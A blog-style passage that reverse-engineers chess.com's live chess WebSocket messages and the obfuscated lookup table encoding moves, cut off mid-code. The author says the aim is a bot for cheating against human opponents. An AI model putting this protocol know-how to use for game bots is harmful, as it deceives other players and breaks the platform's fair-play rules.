<div class="highlight"><pre>[{&quot;data&quot;:{&quot;sid&quot;:&quot;gserv&quot;,&quot;game&quot;:{&quot;id&quot;:709324515,&quot;gametype&quot;:&quot;chess&quot;,&quot;time&quot;:{&quot;basetime&quot;:600,&quot;timeinc&quot;:0},&quot;players&quot;:[{&quot;uid&quot;:&quot;DAHUANXIONG&quot;,&quot;status&quot;:&quot;online&quot;,&quot;lag&quot;:2,&quot;lagms&quot;:220,&quot;lightning&quot;:2105,&quot;blitz&quot;:2064,&quot;standard&quot;:1361,&quot;lightning960&quot;:1200,&quot;blitz960&quot;:1200,&quot;standard960&quot;:1200,&quot;bughouse&quot;:1200,&quot;ml&quot;:10,&quot;title&quot;:null,&quot;mod&quot;:false,&quot;new&quot;:false,&quot;country&quot;:&quot;CN&quot;,&quot;av&quot;:true,&quot;avatar&quot;:&quot;//d1lalstwiwz2br.cloudfront.net/images_users/avatars/DAHUANXIONG_small.1.jpeg&quot;,&quot;clientfeatures&quot;:{&quot;examineboard&quot;:true,&quot;multiplegames&quot;:true,&quot;clientname&quot;:&quot;LC4Full v2013121801; Chrome/25; Windows&quot;},&quot;nonverified&quot;:true},{&quot;uid&quot;:&quot;Mrsinj&quot;,&quot;status&quot;:&quot;playing&quot;,&quot;lag&quot;:2,&quot;lagms&quot;:259,&quot;gid&quot;:709324515,&quot;lightning&quot;:2153,&quot;blitz&quot;:2205,&quot;standard&quot;:1200,&quot;lightning960&quot;:1200,&quot;blitz960&quot;:1200,&quot;standard960&quot;:1200,&quot;bughouse&quot;:1200,&quot;ml&quot;:10,&quot;title&quot;:null,&quot;mod&quot;:false,&quot;new&quot;:false,&quot;country&quot;:&quot;RS&quot;,&quot;av&quot;:true,&quot;avatar&quot;:&quot;//d1lalstwiwz2br.cloudfront.net/images_users/avatars/Mrsinj_s.1.jpg&quot;,&quot;clientfeatures&quot;:{&quot;examineboard&quot;:false,&quot;multiplegames&quot;:true,&quot;clientname&quot;:&quot;LC4Simple v2013121801; Chrome/32; Windows&quot;}}]},&quot;tid&quot;:&quot;Game&quot;},&quot;channel&quot;:&quot;/game/~1&quot;}]
</pre></div>


<p>If you're not a fan of such unformatted, jammed JSON data, you should
inspect the code on a online JSON editor like
<a href="http://www.jsoneditoronline.org/">www.jsoneditoronline.org</a>.</p>
<p>A few interesting fields: <em>uid</em> identifies the players, <em>status</em> can be
<em>starting</em>, <em>in_progress</em>, <em>aborted</em> or <em>stopped</em>, <em>lag</em> and <em>lagms</em>
specify the lag of the player (How can you measure that?). Funny enough,
the protocol architect uses redundant information here, <em>lag</em> is just
the rounded version of <em>lagms</em>, but it doesn't bring other information.</p>
<p><em>gid</em> is the global game id. For instance, you should be able to revisit
the upper game under the following link
<em>http://www.chess.com/livechess/game?id=709324515</em>. But this particular
message above is not of big interest, because it doesn't contain any
moves, it just provides some status information. The packets that are
sent on every move made look like the next message:</p>
<div class="highlight"><pre>[{&quot;data&quot;:{&quot;sid&quot;:&quot;gserv&quot;,&quot;game&quot;:{&quot;id&quot;:709324427,&quot;status&quot;:&quot;in_progress&quot;,&quot;seq&quot;:9,&quot;players&quot;:[{&quot;uid&quot;:&quot;ImaginaryDunker&quot;,&quot;status&quot;:&quot;playing&quot;,&quot;lag&quot;:1,&quot;lagms&quot;:132,&quot;gid&quot;:709324427},{&quot;uid&quot;:&quot;Alexander_Donchenko&quot;,&quot;status&quot;:&quot;playing&quot;,&quot;lag&quot;:1,&quot;lagms&quot;:115,&quot;gid&quot;:709324427}],&quot;moves&quot;:&quot;gvYIlBIBvB0KBrZJow&quot;,&quot;clocks&quot;:[582,571],&quot;draws&quot;:[],&quot;squares&quot;:[0,0]},&quot;tid&quot;:&quot;GameState&quot;},&quot;channel&quot;:&quot;/game/709324427&quot;}]
</pre></div>


<p>Three fields are of particular importance,
<em>"moves":"gvYIlBIBvB0KBrZJow"</em>, <em>"clocks":[582,571]</em> and
<em>"status":"in_progress"</em>. They are pretty much self explanatory at this
point I suppose.</p>
<p>So let's finally <strong>look at a typical game session</strong> in terms of parsed
WebSocket messages. Please note that I might not include all messages
that are exchanged in a game session, simply because I don't care to
much for trivial information (like polling the server for specific
features). The bottom messages are the ones which count when you want to
understand a typical game session:</p>
<p>First of all, a connection message to the server is sent when the
browser connects to the server:</p>
<p><strong>1. Initial connection outbound message</strong></p>
<div class="highlight"><pre><span class="p">[{</span><span class="s2">&quot;channel&quot;</span><span class="s-Atom">:</span><span class="s2">&quot;/meta/connect&quot;</span><span class="p">,</span><span class="s2">&quot;connectionType&quot;</span><span class="s-Atom">:</span><span class="s2">&quot;ssl-websocket&quot;</span><span class="p">,</span><span class="s2">&quot;advice&quot;</span><span class="s-Atom">:</span><span class="p">{</span><span class="s2">&quot;timeout&quot;</span><span class="s-Atom">:</span><span class="mi">0</span><span class="p">},</span><span class="s2">&quot;id&quot;</span><span class="s-Atom">:</span><span class="s2">&quot;10&quot;</span><span class="p">,</span><span class="s2">&quot;clientId&quot;</span><span class="s-Atom">:</span><span class="s2">&quot;6djua267g6n8ydja21m8yhztj3gtpx&quot;</span><span class="p">,</span><span class="s2">&quot;ext&quot;</span><span class="s-Atom">:</span><span class="p">{</span><span class="s2">&quot;ack&quot;</span><span class="p">:-</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;timesync&quot;</span><span class="s-Atom">:</span><span class="p">{</span><span class="s2">&quot;tc&quot;</span><span class="s-Atom">:</span><span class="mi">1390715596738</span><span class="p">,</span><span class="s2">&quot;l&quot;</span><span class="s-Atom">:</span><span class="mi">661</span><span class="p">,</span><span class="s2">&quot;o&quot;</span><span class="p">:-</span><span class="mi">17527952</span><span class="p">}}}]</span>
</pre></div>


<p>I am not sure, that encoding/encryption the clientId is, but it didn't
matter for my purpose to write a bot. So when I expect a challenge from
another player, I receive such a packet:</p>
<p><strong>2. Game begins</strong></p>
<div class="highlight"><pre>[{&quot;data&quot;:{&quot;sid&quot;:&quot;gserv&quot;,&quot;game&quot;:{&quot;id&quot;:709341692,&quot;status&quot;:&quot;starting&quot;,&quot;seq&quot;:0,&quot;players&quot;:[{&quot;uid&quot;:&quot;ponkhan&quot;,&quot;status&quot;:&quot;playing&quot;,&quot;lag&quot;:2,&quot;lagms&quot;:285,&quot;gid&quot;:709341692},{&quot;uid&quot;:&quot;EatingSpiders&quot;,&quot;status&quot;:&quot;playing&quot;,&quot;lag&quot;:1,&quot;lagms&quot;:177,&quot;gid&quot;:709341692}],&quot;abortable&quot;:[true,true],&quot;moves&quot;:&quot;&quot;,&quot;clocks&quot;:[600,600],&quot;draws&quot;:[],&quot;repeated&quot;:true,&quot;squares&quot;:[0,0]},&quot;tid&quot;:&quot;GameState&quot;},&quot;channel&quot;:&quot;/game/709341692&quot;}]
</pre></div>


<p>Noteworthy is the <em>status</em> "starting". As you can see, the <em>moves</em> value
is still empty. Then my adversary made a move and I receive again a
message in the style as above:</p>
<p><strong>3. First move received</strong></p>
<div class="highlight"><pre>[{&quot;data&quot;:{&quot;sid&quot;:&quot;gserv&quot;,&quot;game&quot;:{&quot;id&quot;:709341692,&quot;status&quot;:&quot;starting&quot;,&quot;seq&quot;:1,&quot;players&quot;:[{&quot;uid&quot;:&quot;ponkhan&quot;,&quot;status&quot;:&quot;playing&quot;,&quot;lag&quot;:3,&quot;lagms&quot;:381,&quot;gid&quot;:709341692},{&quot;uid&quot;:&quot;EatingSpiders&quot;,&quot;status&quot;:&quot;playing&quot;,&quot;lag&quot;:1,&quot;lagms&quot;:183,&quot;gid&quot;:709341692}],&quot;abortable&quot;:[true,true],&quot;moves&quot;:&quot;mC&quot;,&quot;clocks&quot;:[600,600],&quot;draws&quot;:[],&quot;squares&quot;:[0,0]},&quot;tid&quot;:&quot;GameState&quot;},&quot;channel&quot;:&quot;/game/709341692&quot;}]
</pre></div>


<p>Now <em>moves</em> isn't empty anymore, it contains <em>"mC"</em>, but what the heck
does it mean?</p>
<p>It's basically a encoding of chess.com for their move notation. I don't
know why the chose it, maybe it's represents a compression because it'd
use n/2 of the space where n is the number of bytes used in the
<a href="http://en.wikipedia.org/wiki/Algebraic_notation_(chess)">algebraic chess
notation.</a>.</p>
<p>But I honestly doubt it, because there are far better compression
methods for 64 possible squares (and some promotion combinations).</p>
<p>Maybe it's a way to stop stupid cheaters like me to pursue their
devilish deeds, but that can't be possible, since the method that
decoded/decrypts the move notation isn't more than a simple look-up
table:</p>
<p>Here is the relevant code part of the obfuscated javascript source in
LiveChessCore.js, at line 8577 (after applying Chrome's pretty print
functionality):</p>
<div class="highlight"><pre><span class="p">(</span><span class="n">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">zf9bd6</span> <span class="o">=</span> <span class="n">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">this</span><span class="p">.</span><span class="n">z6439d</span> <span class="o">=</span> <span class="p">{</span><span class="s">&quot;a1&quot;</span><span class="o">:</span> <span class="s">&quot;a&quot;</span><span class="p">,</span><span class="s">&quot;a2&quot;</span><span class="o">:</span> <span class="s">&quot;i&quot;</span><span class="p">,</span><span class="s">&quot;a3&quot;</span><span class="o">:</span> <span class="s">&quot;q&quot;</span><span class="p">,</span><span class="s">&quot;a4&quot;</span><span class="o">:</span> <span class="s">&quot;y&quot;</span><span class="p">,</span><span class="s">&quot;a5&quot;</span><span class="o">:</span> <span class="s">&quot;G&quot;</span><span class="p">,</span><span class="s">&quot;a6&quot;</span><span class="o">:</span> <span class="s">&quot;O&quot;</span><span class="p">,</span><span class="s">&quot;a7&quot;</span><span class="o">:</span> <span class="s">&quot;W&quot;</span><span class="p">,</span><span class="s">&quot;a8&quot;</span><span class="o">:</span> <span class="s">&quot;4&quot;</span><span class="p">,</span><span class="s">&quot;b1&quot;</span><span class="o">:</span> <span class="s">&quot;b&quot;</span><span class="p">,</span><span class="s">&quot;b2&quot;</span><span class="o">:</span> <span class="s">&quot;j&quot;</span><span class="p">,</span><span class="s">&quot;b3&quot;</span><span class="o">:</span> <span class="s">&quot;r&quot;</span><span class="p">,</span><span class="s">&quot;b4&quot;</span><span class="o">:</span> <span class="s">&quot;z&quot;</span><span class="p">,</span><span class="s">&quot;b5&quot;</span><span class="o">:</span> <span class="s">&quot;H&quot;</span><span class="p">,</span><span class="s">&quot;b6&quot;</span><span class="o">:</span> <span class="s">&quot;P&quot;</span><span class="p">,</span><span class="s">&quot;b7&quot;</span><span class="o">:</span> <span class="s">&quot;X&quot;</span><span class="p">,</span><span class="s">&quot;b8&quot;</span><span class="o">:</span> <span class="s">&quot;5&quot;</span><span class="p">,</span><span class="s">&quot;c1&quot;</span><span class="o">:</span> <span class="s">&quot;c&quot;</span><span class="p">,</span><span class="s">&quot;c2&quot;</span><span class="o">:</span> <span class="s">&quot;k&quot;</span><span class="p">,</span><span class="s">&quot;c3&quot;</span><span class="o">:</span> <span class="s">&quot;s&quot;</span><span class="p">,</span><span class="s">&quot;c4&quot;</span><span class="o">:</span> <span class="s">&quot;A&quot;</span><span class="p">,</span><span class="s">&quot;c5&quot;</span><span class="o">:</span> <span class="s">&quot;I&quot;</span><span class="p">,</span><span class="s">&quot;c6&quot;</span><span class="o">:</span> <span class="s">&quot;Q&quot;</span><span class="p">,</span><span class="s">&quot;c7&quot;</span><span class="o">:</span> <span class="s">&quot;Y&quot;</span><span class="p">,</span><span class="s">&quot;c8&quot;</span><span class="o">:</span> <span class="s">&quot;6&quot;</span><span class="p">,</span><span class="s">&quot;d1&quot;</span><span class="o">:</span> <span class="s">&quot;d&quot;</span><span class="p">,</span><span class="s">&quot;d2&quot;</span><span class="o">:</span> <span class="s">&quot;l&quot;</span><span class="p">,</span><span class="s">&quot;d3&quot;</span><span class="o">:</span> <span class="s">&quot;t&quot;</span><span class="p">,</span><span class="s">&quot;d4&quot;</span><span class="o">:</span> <span class="s">&quot;B&quot;</span><span class="p">,</span><span class="s">&quot;d5&quot;</span><span class="o">:</span> <span class="s">&quot;J&quot;</span><span class="p">,</span><span class="s">&quot;d6&quot;</span><span class="o">:</span> <span class="s">&quot;R&quot;</span><span class="p">,</span><span class="s">&quot;d7&quot;</span><span class="o">:</span> <span class="s">&quot;Z&quot;</span><span class="p">,</span><span class="s">&quot;d8&quot;</span><span class="o">:</span> <span class="s">&quot;7&quot;</span><span class="p">,</span><span class="s">&quot;e1&quot;</span><span class="o">:</span> <span class="s">&quot;e&quot;</span><span class="p">,</span><span class="s">&quot;e2&quot;</span><span class="o">:</span> <span class="s">&quot;m&quot;</span><span class="p">,</span><span class="s">&quot;e3&quot;</span><span class="o">:</span> <span class="s">&quot;u&quot;</span><span class="p">,</span><span class="s">&quot;e4&quot;</span><span class="o">:</span> <span class="s">&quot;C&quot;</span><span class="p">,</span><span class="s">&quot;e5&quot;</span><span class="o">:</span> <span class="s">&quot;K&quot;</span><span class="p">,</span><span class="s">&quot;e6&quot;</span><span class="o">:</span> <span class="s">&quot;S&quot;</span><span class="p">,</span><span class="s">&quot;e7&quot;</span><span class="o">:</span> <span class="s">&quot;0&quot;</span><span class="p">,</span><span class="s">&quot;e8&quot;</span><span class="o">:</span> <span class="s">&quot;8&quot;</span><span class="p">,</span><span class="s">&quot;f1&quot;</span><span class="o">:</span> <span class="s">&quot;f&quot;</span><span class="p">,</span><span class="s">&quot;f2&quot;</span><span class="o">:</span> <span class="s">&quot;n&quot;</span><span class="p">,</span><span class="s">&quot;f3&quot;</span><span class="o">:</span> <span class="s">&quot;v&quot;</span><span class="p">,</span><span class="s">&quot;f4&quot;</span><span class="o">:</span> <span class="s">&quot;D&quot;</span><span class="p">,</span><span class="s">&quot;f5&quot;</span><span class="o">:</span> <span class="s">&quot;L&quot;</span><span class="p">,</span><span class="s">&quot;f6&quot;</span><span class="o">:</span> <span class="s">&quot;T&quot;</span><span class="p">,</span><span class="s">&quot;f7&quot;</span><span class="o">:</span> <span class="s">&quot;1&quot;</span><span class="p">,</span><span class="s">&quot;f8&quot;</span><span class="o">:</span> <span class="s">&quot;9&quot;</span><span class="p">,</span><span class="s">&quot;g1&quot;</span><span class="o">:</span> <span class="s">&quot;g&quot;</span><span class="p">,</span><span class="s">&quot;g2&quot;</span><span class="o">:</span> <span class="s">&quot;o&quot;</span><span class="p">,</span><span class="s">&quot;g3&quot;</span><span class="o">:</span> <span class="s">&quot;w&quot;</span><span class="p">,</span><span class="s">&quot;g4&quot;</span><span class="o">:</span> <span class="s">&quot;E&quot;</span><span class="p">,</span><span class="s">&quot;g5&quot;</span><span class="o">:</span> <span class="s">&quot;M&quot;</span><span class="p">,</span><span class="s">&quot;g6&quot;</span><span class="o">:</span> <span class="s">&quot;U&quot;</span><span class="p">,</span><span class="s">&quot;g7&quot;</span><span class="o">:</span> <span class="s">&quot;2&quot;</span><span class="p">,</span><span class="s">&quot;g8&quot;</span><span class="o">:</span> <span class="s">&quot;!&quot;</span><span class="p">,</span><span class="s">&quot;h1&quot;</span><span class="o">:</span> <span class="s">&quot;h&quot;</span><span class="p">,</span><span class="s">&quot;h2&quot;</span><span class="o">:</span> <span class="s">&quot;p&quot;</span><span class="p">,</span><span class="s">&quot;h3&quot;</span><span class="o">:</span> <span class="s">&quot;x&quot;</span><span class="p">,</span><span class="s">&quot;h4&quot;</span><span class="o">:</span> <span class="s">&quot;F&quot;</span><span class="p">,</span><span class="s">&quot;h5&quot;</span><span class="o">:</span> <span class="s">&quot;N&quot;</span><span class="p">,</span><span class="s">&quot;h6&quot;</span><span class="o">:</span> <span class="s">&quot;V&quot;</span><span class="p">,</span><span class="s">&quot;h7&quot;</span><span class="o">:</span> <span class="s">&quot;3&quot;</span><span class="p">,</span><span class="s">&quot;h8&quot;</span><span class="o">:</span> <span class="s">&quot;?&quot;</span><span class="p">};</span>
        <span class="n">this</span><span class="p">.</span><span class="n">ze8500</span> <span class="o">=</span> <span class="p">{</span><span class="s">&quot;_a&quot;</span><span class="o">:</span> <span class="s">&quot;a1&quot;</span><span class="p">,</span><span class="s">&quot;_i&quot;</span><span class="o">:</span> <span class="s">&quot;a2&quot;</span><span class="p">,</span><span class="s">&quot;_q&quot;</span><span class="o">:</span> <span class="s">&quot;a3&quot;</span><span class="p">,</span><span class="s">&quot;_y&quot;</span><span class="o">:</span> <span class="s">&quot;a4&quot;</span><span class="p">,</span><span class="s">&quot;_G&quot;</span><span class="o">:</span> <span class="s">&quot;a5&quot;</span><span class="p">,</span><span class="s">&quot;_O&quot;</span><span class="o">:</span> <span class="s">&quot;a6&quot;</span><span class="p">,</span><span class="s">&quot;_W&quot;</span><span class="o">:</span> <span class="s">&quot;a7&quot;</span><span class="p">,</span><span class="s">&quot;_4&quot;</span><span class="o">:</span> <span class="s">&quot;a8&quot;</span><span class="p">,</span><span class="s">&quot;_b&quot;</span><span class="o">:</span> <span class="s">&quot;b1&quot;</span><span class="p">,</span><span class="s">&quot;_j&quot;</span><span class="o">:</span> <span class="s">&quot;b2&quot;</span><span class="p">,</span><span class="s">&quot;_r&quot;</span><span class="o">:</span> <span class="s">&quot;b3&quot;</span><span class="p">,</span><span class="s">&quot;_z&quot;</span><span class="o">:</span> <span class="s">&quot;b4&quot;</span><span class="p">,</span><span class="s">&quot;_H&quot;</span><span class="o">:</span> <span class="s">&quot;b5&quot;</span><span class="p">,</span><span class="s">&quot;_P&quot;</span><span class="o">:</span> <span class="s">&quot;b6&quot;</span><span class="p">,</span><span class="s">&quot;_X&quot;</span><span class="o">:</span> <span class="s">&quot;b7&quot;</span><span class="p">,</span><span class="s">&quot;_5&quot;</span><span class="o">:</span> <span class="s">&quot;b8&quot;</span><span class="p">,</span><span class="s">&quot;_c&quot;</span><span class="o">:</span> <span class="s">&quot;c1&quot;</span><span class="p">,</span><span class="s">&quot;_k&quot;</span><span class="o">:</span> <span class="s">&quot;c2&quot;</span><span class="p">,</span><span class="s">&quot;_s&quot;</span><span class="o">:</span> <span class="s">&quot;c3&quot;</span><span class="p">,</span><span class="s">&quot;_A&quot;</span><span class="o">:</span> <span class="s">&quot;c4&quot;</span><span class="p">,</span><span class="s">&quot;_I&quot;</span><span class="o">:</span> <span class="s">&quot;c5&quot;</span><span class="p">,</span><span class="s">&quot;_Q&quot;</span><span class="o">:</span> <span class="s">&quot;c6&quot;</span><span class="p">,</span><span class="s">&quot;_Y&quot;</span><span class="o">:</span> <span class="s">&quot;c7&quot;</span><span class="p">,</span><span class="s">&quot;_6&quot;</span><span class="o">:</span> <span class="s">&quot;c8&quot;</span><span class="p">,</span><span class="s">&quot;_d&quot;</span><span class="o">:</span> <span class="s">&quot;d1&quot;</span><span class="p">,</span><span class="s">&quot;_l&quot;</span><span class="o">:</span> <span class="s">&quot;d2&quot;</span><span class="p">,</span><span class="s">&quot;_t&quot;</span><span class="o">:</span> <span class="s">&quot;d3&quot;</span><span class="p">,</span><span class="s">&quot;_B&quot;</span><span class="o">:</span> <span class="s">&quot;d4&quot;</span><span class="p">,</span><span class="s">&quot;_J&quot;</span><span class="o">:</span> <span class="s">&quot;d5&quot;</span><span class="p">,</span><span class="s">&quot;_R&quot;</span><span class="o">:</span> <span class="s">&quot;d6&quot;</span><span class="p">,</span><span class="s">&quot;_Z&quot;</span><span class="o">:</span> <span class="s">&quot;d7&quot;</span><span class="p">,</span><span class="s">&quot;_7&quot;</span><span class="o">:</span> <span class="s">&quot;d8&quot;</span><span class="p">,</span><span class="s">&quot;_e&quot;</span><span class="o">:</span> <span class="s">&quot;e1&quot;</span><span class="p">,</span><span class="s">&quot;_m&quot;</span><span class="o">:</span> <span class="s">&quot;e2&quot;</span><span class="p">,</span><span class="s">&quot;_u&quot;</span><span class="o">:</span> <span class="s">&quot;e3&quot;</span><span class="p">,</span><span class="s">&quot;_C&quot;</span><span class="o">:</span> <span class="s">&quot;e4&quot;</span><span class="p">,</span><span class="s">&quot;_K&quot;</span><span class="o">:</span> <span class="s">&quot;e5&quot;</span><span class="p">,</span><span class="s">&quot;_S&quot;</span><span class="o">:</span> <span class="s">&quot;e6&quot;</span><span class="p">,</span><span class="s">&quot;_0&quot;</span><span class="o">:</span> <span class="s">&quot;e7&quot;</span><span class="p">,</span><span class="s">&quot;_8&quot;</span><span class="o">:</span> <span class="s">&quot;e8&quot;</span><span class="p">,</span><span class="s">&quot;_f&quot;</span><span class="o">:</span> <span class="s">&quot;f1&quot;</span><span class="p">,</span><span class="s">&quot;_n&quot;</span><span class="o">:</span> <span class="s">&quot;f2&quot;</span><span class="p">,</span><span class="s">&quot;_v&quot;</span><span class="o">:</span> <span class="s">&quot;f3&quot;</span><span class="p">,</span><span class="s">&quot;_D&quot;</span><span class="o">:</span> <span class="s">&quot;f4&quot;</span><span class="p">,</span><span class="s">&quot;_L&quot;</span><span class="o">:</span> <span class="s">&quot;f5&quot;</span><span class="p">,</span><span class="s">&quot;_T&quot;</span><span class="o">:</span> <span class="s">&quot;f6&quot;</span><span class="p">,</span><span class="s">&quot;_1&quot;</span><span class="o">:</span> <span class="s">&quot;f7&quot;</span><span class="p">,</span><span class="s">&quot;_9&quot;</span><span class="o">:</span> <span class="s">&quot;f8&quot;</span><span class="p">,</span><span class="s">&quot;_g&quot;</span><span class="o">:</span> <span class="s">&quot;g1&quot;</span><span class="p">,</span><span class="s">&quot;_o&quot;</span><span class="o">:</span> <span class="s">&quot;g2&quot;</span><span class="p">,</span><span class="s">&quot;_w&quot;</span><span class="o">:</span> <span class="s">&quot;g3&quot;</span><span class="p">,</span><span class="s">&quot;_E&quot;</span><span class="o">:</span> <span class="s">&quot;g4&quot;</span><span class="p">,</span><span class="s">&quot;_M&quot;</span><span class="o">:</span> <span class="s">&quot;g5&quot;</span><span class="p">,</span><span class="s">&quot;_U&quot;</span><span class="o">:</span> <span class="s">&quot;g6&quot;</span><span class="p">,</span><span class="s">&quot;_2&quot;</span><span class="o">:</span> <span class="s">&quot;g7&quot;</span><span class="p">,</span><span class="s">&quot;_!&quot;</span><span class="o">:</span> <span class="s">&quot;g8&quot;</span><span class="p">,</span><span class="s">&quot;_h&quot;</span><span class="o">:</span> <span class="s">&quot;h1&quot;</span><span class="p">,</span><span class="s">&quot;_p&quot;</span><span class="o">:</span> <span class="s">&quot;h2&quot;</span><span class="p">,</span><span class="s">&quot;_x&quot;</span><span class="o">:</span> <span class="s">&quot;h3&quot;</span><span class="p">,</span><span class="s">&quot;_F&quot;</span><span class="o">:</span> <span class="s">&quot;h4&quot;</span><span class="p">,</span><span class="s">&quot;_N&quot;</span><span class="o">:</span> <span class="s">&quot;h5&quot;</span><span class="p">,</span><span class="s">&quot;_V&quot;</span><span class="o">:</span> <span class="s">&quot;h6&quot;</span><span class="p">,</span><span class="s">&quot;_3&quot;</span><span class="o">:</span> <span class="s">&quot;h7&quot;</span><span class="p">,</span><span class="s">&quot;_?&quot;</span><span class="o">:</span> <span class="s">&quot;h8&quot;</span><span class="p">};</span>
        <span class="n">this</span><span class="p">.</span><span class="n">z56f6c</span> <span class="o">=</span> <span class="s">&quot;{&quot;</span><span class="p">;</span>
        <span class="n">this</span><span class="p">.</span><span class="n">z87e36</span> <span class="o">=</span> <span class="s">&quot;~&quot;</span><span class="p">;</span>
        <span class="n">this</span><span class="p">.</span><span class="n">zbba2c</span> <span class="o">=</span> <span class="s">&quot;}&quot;</span><span class="p">;</span>
        <span class="n">this</span><span class="p">.</span><span class="n">z7fd23</span> <span class="o">=</span> <span class="s">&quot;(&quot;</span><span class="p">;</span>
        <span class="n">this</span><span class="p">.</span><span class="n">za93ff</span> <span class="o">=</span> <span class="s">&quot;^&quot;</span><span class="p">;</span>
        <span class="n">this</span><span class="p">.</span><span class="n">z536e1</span> <span class="o">=</span> <span class="s">&quot;)&quot;</span><span class="p">;</span>
        <span class="n">this</span><span class="p">.</span><span class="n">z817b2</span> <span class="o">=</span> <span class="s">&quot;[&quot;</span><span class="p">;</span>
        <span class="n">this</span><span class="p">.</span><span class="n">z00e3d</span> <span class="o">=</span> <span class="s">&quot;_&quot;</span><span class="p">;</span>
        <span class="n">this</span><span class="p">.</span><span class="n">ze4b5e</span> <span class="o">=</span> <span class="s">&quot;]&quot;</span><span class="p">;</span>
        <span class="n">this</span><span class="p">.</span><span class="n">z91a79</span> <span class="o">=</span> <span class="s">&quot;@&quot;</span><span class="p">;</span>
        <span class="n">this</span><span class="p">.</span><span class="n">zc21d8</span> <span class="o">=</span> <span class="s">&quot;#&quot;</span><span class="p">;</span>
        <span class="n">this</span><span class="p">.</span><span class="n">zaa236</span> <span class="o">=</span> <span class="s">&quot;$&quot;</span><span class="p">;</span>
    <span class="p">};</span>
    <span class="n">zf9bd6</span><span class="p">.</span><span class="n">prototype</span> <span class="o">=</span> <span class="p">{</span><span class="nl">z0cd66</span><span class="p">:</span> <span class="n">function</span><span class="p">(</span><span class="n">ze2e37</span><span class="p">,</span> <span class="n">zbd29b</span><span class="p">,</span> <span class="n">z2ba00</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">var</span> <span class="n">zed3d4</span> <span class="o">=</span> <span class="n">this</span><span class="p">.</span><span class="n">z6439d</span><span class="p">[</span><span class="n">ze2e37</span><span class="p">];</span>
            <span class="n">var</span> <span class="n">z98075</span> <span class="o">=</span> <span class="n">this</span><span class="p">.</span><span class="n">z6439d</span><span class="p">[</span><span class="n">zbd29b</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">z2ba00</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">var</span> <span class="n">dir</span> <span class="o">=</span> <span class="n">zbd29b</span><span class="p">.</span><span class="n">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="n">ze2e37</span><span class="p">.</span><span class="n">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">z2ba00</span> <span class="o">==</span> <span class="s">&quot;q&quot;</span><span class="p">)</span>
                    <span class="n">z98075</span> <span class="o">=</span> <span class="p">(</span><span class="n">dir</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">?</span> <span class="n">this</span><span class="p">.</span><span class="nl">z56f6c</span> <span class="p">:</span> <span class="p">((</span><span class="n">dir</span> <span class="o">==</span> <span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">?</span> <span class="n">this</span><span class="p">.</span><span class="nl">zbba2c</span> <span class="p">:</span> <span class="n">this</span><span class="p">.</span><span class="n">z87e36</span><span class="p">);</span>
                <span class="k">else</span> 
                <span class="nf">if</span> <span class="p">(</span><span class="n">z2ba00</span> <span class="o">==</span> <span class="s">&quot;n&quot;</span><span class="p">)</span>
                    <span class="n">z98075</span> <span class="o">=</span> <span class="p">(</span><span class="n">dir</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">?</span> <span class="n">this</span><span class="p">.</span><span class="nl">z7fd23</span> <span class="p">:</span> <span class="p">((</span><span class="n">dir</span> <span class="o">==</span> <span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">?</span> <span class="n">this</span><span class="p">.</span><span class="nl">z536e1</span> <span class="p">:</span> <span class="n">this</span><span class="p">.</span><span class="n">za93ff</span><span class="p">);</span>
                <span class="k">else</span> 
                <span class="nf">if</span> <span class="p">(</span><span class="n">z2ba00</span> <span class="o">==</span> <span class="s">&quot;r&quot;</span><span class="p">)</span>
                    <span class="n">z98075</span> <span class="o">=</span> <span class="p">(</span><span class="n">dir</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">?</span> <span class="n">this</span><span class="p">.</span><span class="nl">z817b2</span> <span class="p">:</span> <span class="p">((</span><span class="n">dir</span> <span class="o">==</span> <span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">?</span> <span class="n">this</span><span class="p">.</span><span class="nl">ze4b5e</span> <span class="p">:</span> <span class="n">this</span><span class="p">.</span><span class="n">z00e3d</span><span class="p">);</span>
                <span class="k">else</span> 
                <span class="nf">if</span> <span class="p">(</span><span class="n">z2ba00</span> <span class="o">==</span> <span class="s">&quot;b&quot;</span><span class="p">)</span>
                    <span class="n">z98075</span> <span class="o">=</span> <span class="p">(</span><span class="n">dir</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">?</span> <span class="n">this</span><span class="p">.</span><span class="nl">z91a79</span> <span class="p">:</span> <span class="p">((</span><span class="n">dir</span> <span class="o">==</span> <span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">?</span> <span class="n">this</span><span class="p">.</span><span class="nl">zaa236</span> <span class="p">:</span> <span class="n">this</span><span class="p">.</span><span class="n">zc21d8</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="n">zed3d4</span> <span class="o">+</span> <span class="n">z98075</span><span class="p">;</span>
        <span class="p">},</span><span class="nl">zafc74</span><span class="p">:</span> <span class="n">function</span><span class="p">(</span><span class="n">z32182</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">var</span> <span class="n">zed3d4</span> <span class="o">=</span> <span class="n">z32182</span><span class="p">.</span><span class="n">charAt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
            <span class="n">var</span> <span class="n">z98075</span> <span class="o">=</span> <span class="n">z32182</span><span class="p">.</span><span class="n">charAt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
            <span class="n">var</span> <span class="n">ze2e37</span> <span class="o">=</span> <span class="n">this</span><span class="p">.</span><span class="n">ze8500</span><span class="p">[</span><span class="s">&quot;_&quot;</span> <span class="o">+</span> <span class="n">zed3d4</span><span class="p">];</span>
            <span class="n">var</span> <span class="n">zbd29b</span><span class="p">;</span>
            <span class="n">var</span> <span class="n">z2ba00</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
